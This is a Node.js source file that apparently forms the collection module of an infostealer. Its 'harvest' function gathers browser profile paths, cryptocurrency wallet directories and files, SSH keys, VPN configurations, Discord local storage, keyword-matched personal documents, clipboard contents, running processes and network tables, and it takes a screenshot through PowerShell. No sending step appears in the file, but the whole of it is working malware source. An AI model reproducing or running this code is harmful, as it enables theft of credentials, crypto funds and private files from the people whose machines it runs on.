const { execSync } = require('child_process');
const fs = require('fs');
const path = require('path');
const os = require('os');

const IS_WIN = process.platform === 'win32';

function runCmd(cmd) {
  try { return execSync(cmd, { shell: 'cmd.exe', encoding: 'utf8', stdio: ['pipe', 'pipe', 'ignore'] }); }
  catch (_) { return ''; }
}

function getBrowserPaths() {
  const home = os.homedir();
  const paths = {
    chrome: [],
    edge: [],
    firefox: [],
    chromium: []
  };
  if (IS_WIN) {
    paths.chrome = [
      path.join(home, 'AppData', 'Local', 'Google', 'Chrome', 'User Data'),
      path.join(home, 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default')
    ];
    paths.edge = [
      path.join(home, 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data'),
      path.join(home, 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data', 'Default')
    ];
    paths.firefox = [
      path.join(home, 'AppData', 'Roaming', 'Mozilla', 'Firefox', 'Profiles')
    ];
    paths.chromium = [
      path.join(home, 'AppData', 'Local', 'Chromium', 'User Data')
    ];
  }
  return paths;
}

function findCryptoWallets() {
  const home = os.homedir();
  const wallets = [];
  const walletDirs = {
    'MetaMask': [
      path.join(home, 'AppData', 'Roaming', 'npm', 'node_modules', '.globalConfig', 'MetaMask'),
      path.join(home, 'AppData', 'Roaming', 'Code', 'User', 'globalStorage', 'state.vscdb'),
      path.join(home, 'AppData', 'Roaming', 'Google', 'Chrome', 'User Data', 'Default', 'Local Storage', 'leveldb')
    ],
    'Phantom': [
      path.join(home, 'AppData', 'Roaming', 'Phantom'),
      path.join(home, 'AppData', 'Local', 'phantom'),
      path.join(home, 'AppData', 'Roaming', 'npm', 'node_modules', '.globalConfig', 'Phantom')
    ],
    'Exodus': [
      path.join(home, 'AppData', 'Roaming', 'Exodus'),
      path.join(home, 'Local Settings', 'Application Data', 'Exodus')
    ],
    'Electrum': [
      path.join(home, 'AppData', 'Roaming', 'Electrum'),
      path.join(home, 'AppData', 'Local', 'Electrum')
    ],
    'Trust Wallet': [
      path.join(home, 'AppData', 'Roaming', 'Trust'),
      path.join(home, 'Library', 'Application Support', 'Trust')
    ]
  };
  for (const [name, dirs] of Object.entries(walletDirs)) {
    for (const dir of dirs) {
      if (fs.existsSync(dir)) {
        wallets.push({ name, path: dir, found: true });
      }
    }
  }
  return wallets;
}

function findSensitiveFiles() {
  const home = os.homedir();
  const sensitiveExts = ['.pdf', '.docx', '.xlsx', '.pptx', '.zip', '.rar', '.7z', '.tar', '.gz'];
  const sensitiveKeywords = ['senha', 'password', 'wallet', 'key', 'private', 'seed', 'backup', 'config', 'credencial'];
  const targets = [path.join(home, 'Documents'), path.join(home, 'Downloads'), path.join(home, 'Desktop')];
  const found = [];
  function searchDir(dir, depth = 0) {
    if (depth > 5) return;
    if (!fs.existsSync(dir)) return;
    try {
      const items = fs.readdirSync(dir);
      for (const item of items) {
        const fullPath = path.join(dir, item);
        try {
          const stat = fs.statSync(fullPath);
          if (stat.isDirectory()) {
            searchDir(fullPath, depth + 1);
          } else {
            const ext = path.extname(item).toLowerCase();
            const nameLower = item.toLowerCase();
            if (sensitiveExts.includes(ext) || sensitiveKeywords.some(k => nameLower.includes(k))) {
              found.push({ path: fullPath, size: stat.size, name: item });
            }
          }
        } catch (_) { }
      }
    } catch (_) { }
  }
  for (const t of targets) {
    searchDir(t);
  }
  return found;
}

function getActiveProcesses() {
  if (!IS_WIN) return [];
  try {
    const out = runCmd('tasklist /fo csv /v');
    const lines = out.trim().split('\n');
    const processes = [];
    for (let i = 1; i < lines.length; i++) {
      const parts = lines[i].split('","');
      if (parts.length >= 2) {
        processes.push({ name: parts[0].replace(/"/g, ''), pid: parts[1] || 'N/A' });
      }
    }
    return processes;
  } catch (_) { return []; }
}

function getNetworkInfo() {
  if (!IS_WIN) return { arp: [], dns: [], connections: [] };
  try {
    const arp = runCmd('arp -a');
    const dns = runCmd('ipconfig /displaydns');
    const conns = runCmd('netstat -ano');
    return { arp, dns, connections: conns };
  } catch (_) { return { arp: '', dns: '', connections: '' }; }
}

function getClipboardContent() {
  if (!IS_WIN) return '';
  try {
    return runCmd('powershell -Command "Get-Clipboard -Format Text"').trim();
  } catch (_) { return ''; }
}

function captureScreenshot() {
  if (!IS_WIN) return null;
  try {
    const screenPath = path.join(os.tmpdir(), 'screenshot.bmp');
    const ps = `Add-Type -AssemblyName System.Windows.Forms;Add-Type -AssemblyName System.Drawing;` +
      `$screen=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds;` +
      `$bitmap=new-object System.Drawing.Bitmap($screen.Width,$screen.Height);` +
      `$graphics=[System.Drawing.Graphics]::FromImage($bitmap);` +
      `$graphics.CopyFromScreen($screen.Location,[System.Drawing.Point]::Empty,$screen.Size);` +
      `$bitmap.Save('${screenPath.replace(/\\/g, '\\\\')}');`;
    execSync(`powershell -Command "${ps}"`, { stdio: 'ignore', timeout: 5000 });
    return fs.existsSync(screenPath) ? screenPath : null;
  } catch (_) { return null; }
}

function getWalletFiles() {
  const home = os.homedir();
  const walletFiles = [];
  const patterns = [
    { dir: path.join(home, '.ethereum'), ext: '*' },
    { dir: path.join(home, '.bitcoin'), ext: '*' },
    { dir: path.join(home, '.monero'), ext: '*' },
    { dir: path.join(home, '.dash'), ext: '*' },
    { dir: path.join(home, '.zcash'), ext: '*' },
    { dir: path.join(home, 'Library', 'Application Support', 'MetaMask'), ext: '*' },
    { dir: path.join(home, 'Library', 'Application Support', 'Phantom'), ext: '*' }
  ];
  for (const p of patterns) {
    if (fs.existsSync(p.dir)) {
      const items = fs.readdirSync(p.dir);
      for (const item of items) {
        walletFiles.push(path.join(p.dir, item));
      }
    }
  }
  return walletFiles;
}

function getSSHKeys() {
  const home = os.homedir();
  const keys = [];
  const sshDirs = [
    path.join(home, '.ssh'),
    path.join(home, '.config', 'ssh')
  ];
  for (const dir of sshDirs) {
    if (fs.existsSync(dir)) {
      try {
        const files = fs.readdirSync(dir);
        for (const f of files) {
          if (f.includes('id_') || f === 'config' || f.includes('key')) {
            keys.push(path.join(dir, f));
          }
        }
      } catch (_) { }
    }
  }
  return keys;
}

function getVPNConfigs() {
  const home = os.homedir();
  const configs = [];
  const vpnPatterns = [
    { dir: path.join(home, '.openvpn'), ext: '.conf' },
    { dir: path.join(home, '.vpn'), ext: '*' },
    { dir: path.join(home, 'Documents'), ext: '.ovpn' },
    { dir: path.join(home, 'Downloads'), ext: '.ovpn' }
  ];
  for (const p of vpnPatterns) {
    if (fs.existsSync(p.dir)) {
      try {
        const files = fs.readdirSync(p.dir);
        for (const f of files) {
          if (f.endsWith(p.ext)) {
            configs.push(path.join(p.dir, f));
          }
        }
      } catch (_) { }
    }
  }
  return configs;
}

function getDiscordData() {
  const home = os.homedir();
  const data = { channels: [], dms: [] };
  const discordPaths = [
    path.join(home, 'AppData', 'Roaming', 'Discord'),
    path.join(home, 'AppData', 'Roaming', 'discordcanary'),
    path.join(home, 'AppData', 'Roaming', 'discordptb')
  ];
  for (const dp of discordPaths) {
    if (fs.existsSync(dp)) {
      try {
        const appData = path.join(dp, 'Local Storage', 'leveldb');
        if (fs.existsSync(appData)) {
          const files = fs.readdirSync(appData);
          for (const f of files) {
            if (f.endsWith('.log') || f.endsWith('.ldb')) {
              try {
                const content = fs.readFileSync(path.join(appData, f), 'utf8');
                if (content.includes('channel_id') || content.includes('message')) {
                  data.channels.push({ file: f, size: fs.statSync(path.join(appData, f)).size });
                }
              } catch (_) { }
            }
          }
        }
      } catch (_) { }
    }
  }
  return data;
}

async function harvest() {
  const results = {
    timestamp: new Date().toISOString(),
    userInfo: {
      username: os.userInfo().username,
      hostname: os.hostname(),
      platform: os.platform(),
      arch: os.arch(),
      home: os.homedir()
    },
    cryptoWallets: findCryptoWallets(),
    sensitiveFiles: findSensitiveFiles().slice(0, 500),
    activeProcesses: getActiveProcesses(),
    networkInfo: getNetworkInfo(),
    clipboard: getClipboardContent(),
    screenshot: null,
    walletFiles: getWalletFiles(),
    sshKeys: getSSHKeys(),
    vpnConfigs: getVPNConfigs(),
    discordData: getDiscordData()
  };
  results.screenshot = captureScreenshot();
  return results;
}

module.exports = { harvest, findCryptoWallets, findSensitiveFiles, getActiveProcesses, getNetworkInfo, captureScreenshot };